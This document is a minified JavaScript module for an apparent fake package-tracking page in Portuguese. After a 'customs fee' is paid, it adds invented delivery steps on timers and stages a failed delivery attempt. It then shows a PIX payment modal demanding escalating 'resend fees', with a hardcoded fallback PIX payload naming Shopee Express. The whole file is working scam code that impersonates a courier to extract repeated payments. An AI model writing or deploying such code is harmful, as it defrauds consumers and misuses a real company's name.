class y{constructor(e){this.trackingSystem=e,this.deliveryAttempts=0,this.deliveryValues=[7.74,12.38,16.46],this.isProcessing=!1,this.timers=[],this.currentStep=0,this.deliveryPixData=null,console.log("🚀 Sistema de fluxo pós-pagamento inicializado"),console.log("💰 Valores de tentativa:",this.deliveryValues)}startPostPaymentFlow(){console.log("🚀 Iniciando fluxo pós-pagamento..."),this.addTimelineStep({stepNumber:1,title:"Pedido liberado na alfândega de importação",description:"Seu pedido foi liberado após o pagamento da taxa alfandegária",delay:0,nextStepDelay:2*60*60*1e3}),this.addTimelineStep({stepNumber:2,title:"Pedido sairá para entrega",description:"Pedido sairá para entrega para seu endereço",delay:2*60*60*1e3,nextStepDelay:30*60*1e3}),this.addTimelineStep({stepNumber:3,title:"Pedido em trânsito",description:"Pedido em trânsito para seu endereço",delay:2*60*60*1e3+30*60*1e3,nextStepDelay:30*60*1e3}),this.addTimelineStep({stepNumber:4,title:"Pedido em rota de entrega",description:"Pedido em rota de entrega para seu endereço, aguarde",delay:3*60*60*1e3,nextStepDelay:30*60*1e3}),this.addTimelineStep({stepNumber:5,title:"Tentativa de entrega",description:`${this.deliveryAttempts+1}ª tentativa de entrega realizada, mas não foi possível entregar`,delay:3*60*60*1e3+30*60*1e3,isDeliveryAttempt:!0,nextStepDelay:30*60*1e3})}addTimelineStep({stepNumber:e,title:t,description:i,delay:s,nextStepDelay:o,isDeliveryAttempt:n=!1}){const a=setTimeout(()=>{console.log(`📦 Adicionando etapa ${e}: ${t}`);const l=document.getElementById("trackingTimeline");if(!l)return;const d=new Date,r=this.createTimelineItem({stepNumber:e,title:t,description:i,date:d,completed:!0,isDeliveryAttempt:n,nextStepDelay:o});l.appendChild(r),setTimeout(()=>{r.style.opacity="1",r.style.transform="translateY(0)"},100),r.scrollIntoView({behavior:"smooth",block:"center"}),this.currentStep=e},s);this.timers.push(a)}createTimelineItem({stepNumber:e,title:t,description:i,date:s,completed:o,isDeliveryAttempt:n}){const a=document.createElement("div");a.className=`timeline-item ${o?"completed":""}`,a.style.opacity="0",a.style.transform="translateY(20px)",a.style.transition="all 0.5s ease";const l=s.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),d=s.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let r="";if(n&&(r=`
                <button class="liberation-button-timeline delivery-retry-btn" data-attempt="${this.deliveryAttempts}">
                    <i class="fas fa-redo"></i> Reenviar Pacote
                </button>
            `),a.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${l}</span>
                    <span class="time">${d}</span>
                </div>
                <div class="timeline-text">
                    <p>${i}</p>
                    ${r}
                </div>
            </div>
        `,n){const c=a.querySelector(".delivery-retry-btn");c&&this.configureDeliveryRetryButton(c)}return a}configureDeliveryRetryButton(e){e.style.cssText=`
            background: linear-gradient(45deg, #ff6b35, #f7931e);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1rem;
            font-weight: 700;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
            animation: pulse 2s infinite;
            font-family: 'Roboto', sans-serif;
            letter-spacing: 0.5px;
            margin-top: 15px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        `,e.addEventListener("click",()=>{this.handleDeliveryRetry(e)}),console.log("🔄 Botão de reenvio configurado")}async handleDeliveryRetry(e){if(this.isProcessing)return;this.isProcessing=!0;const t=parseInt(e.dataset.attempt),i=this.deliveryValues[t%this.deliveryValues.length];console.log(`🔄 Processando reenvio - Tentativa ${t+1} - R$ ${i.toFixed(2)}`),this.showDeliveryLoadingNotification();try{console.log("🚀 Gerando PIX para tentativa de entrega via Zentra Pay...");const s=await this.trackingSystem.zentraPayService.createPixTransaction(this.trackingSystem.userData,i);if(s.success)console.log("🎉 PIX de reenvio gerado com sucesso!"),this.deliveryPixData=s,this.closeDeliveryLoadingNotification(),setTimeout(()=>{this.showDeliveryPixModal(i,t+1)},300);else throw new Error(s.error||"Erro ao gerar PIX de reenvio")}catch(s){console.error("💥 Erro ao gerar PIX de reenvio:",s),this.closeDeliveryLoadingNotification(),setTimeout(()=>{this.showDeliveryPixModal(i,t+1,!0)},300)}}showDeliveryLoadingNotification(){const e=document.createElement("div");e.id="deliveryLoadingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-truck" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Gerando PIX de Reenvio...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto processamos sua solicitação
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando pagamento...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden"}closeDeliveryLoadingNotification(){const e=document.getElementById("deliveryLoadingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}showDeliveryPixModal(e,t,i=!1){const s=document.createElement("div");s.className="modal-overlay",s.id="deliveryPixModal",s.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;let o,n;!i&&this.deliveryPixData&&this.deliveryPixData.pixPayload?(o=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`,n=this.deliveryPixData.pixPayload,console.log("✅ Usando PIX real do Zentra Pay para reenvio")):(o="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",n="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",console.log("⚠️ Usando PIX estático como fallback para reenvio")),s.innerHTML=`
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Tentativa de Entrega ${t}°</h2>
                    <button class="professional-modal-close" id="closeDeliveryPixModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${e.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${t}° Tentativa</span>
                            <span class="fee-amount">R$ ${e.toFixed(2)}</span>
                        </div>
                    </div>

                    <!-- Seção PIX Real - Zentra Pay -->
                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <!-- QR Code -->
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${o}" alt="QR Code PIX Reenvio" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <!-- PIX Copia e Cola -->
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${n}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Instruções de Pagamento -->
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `,document.body.appendChild(s),document.body.style.overflow="hidden",this.setupDeliveryModalEvents(s,t),console.log(`💳 Modal de PIX para ${t}° tentativa exibido - R$ ${e.toFixed(2)}`)}setupDeliveryModalEvents(e,t){const i=e.querySelector("#closeDeliveryPixModal");i&&i.addEventListener("click",()=>{this.closeDeliveryPixModal()});const s=e.querySelector("#copyDeliveryPixButton");s&&s.addEventListener("click",()=>{this.copyDeliveryPixCode()}),e.addEventListener("click",o=>{o.target===e&&this.closeDeliveryPixModal()})}copyDeliveryPixCode(){const e=document.getElementById("deliveryPixCode"),t=document.getElementById("copyDeliveryPixButton");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{console.log("✅ PIX de reenvio copiado:",e.value.substring(0,50)+"..."),this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(i){console.error("❌ Erro ao copiar PIX de reenvio:",i)}}fallbackCopy(e,t){try{document.execCommand("copy")&&(console.log("✅ PIX de reenvio copiado via execCommand"),this.showCopySuccess(t))}catch(i){console.error("❌ Fallback copy falhou:",i)}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}closeDeliveryPixModal(){const e=document.getElementById("deliveryPixModal");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300)),this.isProcessing=!1}processDeliveryRetry(e){this.hideCurrentRetryButton(e-1),this.deliveryAttempts=e,this.deliveryAttempts>=3&&(this.deliveryAttempts=0),console.log(`✅ Reenvio ${this.deliveryAttempts} processado com sucesso`),console.log(`💰 Próximo valor será: R$ ${this.deliveryValues[this.deliveryAttempts%this.deliveryValues.length].toFixed(2)}`),setTimeout(()=>{this.startDeliveryFlow()},2e3)}hideCurrentRetryButton(e){const t=document.querySelector(`[data-attempt="${e}"]`);t&&(t.closest(".timeline-item").style.display="none")}startDeliveryFlow(){console.log("🚚 Iniciando novo fluxo de entrega..."),this.isProcessing=!1;const e=100+this.deliveryAttempts*10;this.addTimelineStep({stepNumber:e+1,title:"Pedido sairá para entrega",description:"Seu pedido está sendo preparado para nova tentativa de entrega",delay:0,nextStepDelay:30*60*1e3})}isBusinessHour(e){const t=e.getHours(),i=e.getDay();return i>=1&&i<=5&&t>=8&&t<18}getNextBusinessTime(e){const t=new Date(e);return t.getDay()===0?t.setDate(t.getDate()+1):t.getDay()===6&&t.setDate(t.getDate()+2),t.getHours()>=18?(t.setDate(t.getDate()+1),t.setHours(8,0,0,0)):t.getHours()<8&&t.setHours(8,0,0,0),t}clearAllTimers(){this.timers.forEach(e=>clearTimeout(e)),this.timers=[],console.log("🧹 Todos os timers foram limpos")}reset(){this.clearAllTimers(),this.deliveryAttempts=0,this.isProcessing=!1,this.currentStep=0,this.deliveryPixData=null,this.closeDeliveryPixModal(),console.log("🔄 Sistema resetado")}getStatus(){return{deliveryAttempts:this.deliveryAttempts,isProcessing:this.isProcessing,currentStep:this.currentStep,activeTimers:this.timers.length,currentDeliveryValue:this.deliveryValues[this.deliveryAttempts%this.deliveryValues.length],deliveryValues:this.deliveryValues,hasDeliveryPixData:!!this.deliveryPixData}}}export{y as PostPaymentSystem};
